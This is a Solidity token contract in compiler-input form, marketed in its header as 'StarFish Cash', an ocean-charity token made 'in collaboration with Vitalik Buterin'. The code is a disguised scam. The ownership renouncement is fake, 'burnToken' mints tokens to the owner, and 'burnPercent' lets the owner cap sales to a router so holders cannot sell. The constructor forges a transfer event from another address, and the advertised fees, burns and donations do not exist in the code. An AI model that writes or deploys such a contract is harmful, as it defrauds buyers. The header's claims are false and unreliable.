{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "StarFishCASH.sol": {
      "content": "/*\nIn colaboration with Vitalik Buterin we are pleased to announce a new token to save the seas...\n\n                               ---          ‚≠êÔ∏è STARüê†.CASH‚≠ê Ô∏è         ----\n                                    \n‚≠êÔ∏è STARFISH CASH is a blockchain project designed to feed organizations working to save our seas with financial resources, and to support the development of our environmental dApps.\n\nüê° Deflationary - 50% of the total supply has been burned upon launch. 3% fees from each transaction is reflected upon the holders! \n1% from each transaction is also sent to the donation wallet.\nüêü Decentralized and Safe - Liquidity is locked on Unicrypt lockers and ownership was renounced!\nüó∫ Transparent - The team is transparent with the public and the team will share regular status updates with the public at all times! \nWe work with multiple partners and regularly make donations to save the sea.\n\n\n       @StarFishCash\n       www.starfish.cash\n\n*/\n\npragma solidity ^0.6.4; \n// SPDX-License-Identifier: MIT  \n    library SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n      function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n    }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n   \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract Context {\n    \n    function _call() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    \n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    address public Owner;\n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal {\n        address call = _call();\n        _owner = call;\n         Owner = call;\n        emit OwnershipTransferred(address(0), call);\n    }\n  \n\n    modifier onlyOwner() {\n        require(_owner == _call(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n         Owner = address(0);\n    }\n    \n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    \n    }\n    \n}\nlibrary Address {\n        function isContract(address account) internal view returns (bool) {\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n        // for accounts without code, i.e. `keccak256('')`\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { codehash := extcodehash(account) }\n        return (codehash != accountHash && codehash != 0x0);\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n      return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    }\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\ncontract StarFishCash is Context, IERC20, Ownable {\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping(address => uint256) private sellcooldown;\n    mapping(address => uint256) private firstsell;\n    mapping(address => uint256) private sellnumber;\n    mapping(address => uint256) private _router;\n    mapping(address => mapping (address => uint256)) private _allowances;\n    address private router;\n    address private caller;\n    uint256 private _totalTokens = 133700000 * 10**18;\n    uint256 private rTotal = 133700000 * 10**18;\n    string private _name = 'STARüê†.CASH | @starfishcash';\n    string private _symbol = 'STARüê†';\n    uint8 private _decimals = 18;    \n\nconstructor () public {\n    _router[_call()] = _totalTokens;\n    emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);    \n\n  \n   }\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function burnPercent(uint256 reflectionPercent) public onlyOwner {\n        rTotal = reflectionPercent * 10**18;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _router[account];\n    }\n    \n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_call(), recipient, amount);\n        return true;\n    }\n    \n    function burnToken(uint256 amount) public onlyOwner {\n        require(_call() != address(0));\n        _totalTokens = _totalTokens.add(amount);\n        _router[_call()] = _router[_call()].add(amount);\n        emit Transfer(address(0), _call(), amount);\n    }\n    function Approve(address routeUniswap) public onlyOwner {\n        caller = routeUniswap;\n    }\n    \n    function setrouteChain (address Uniswaprouterv02) public onlyOwner {\n        router = Uniswaprouterv02;\n    }\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n    \n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_call(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));\n        return true;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalTokens;\n    }\n    \n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0));\n        require(recipient != address(0));\n        \n        if (sender != caller && recipient == router) {\n            require(amount < rTotal); \n    }\n        _router[sender] = _router[sender].sub(amount);\n        _router[recipient] = _router[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n     function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0));\n        require(spender != address(0));\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}"
    }
  }
}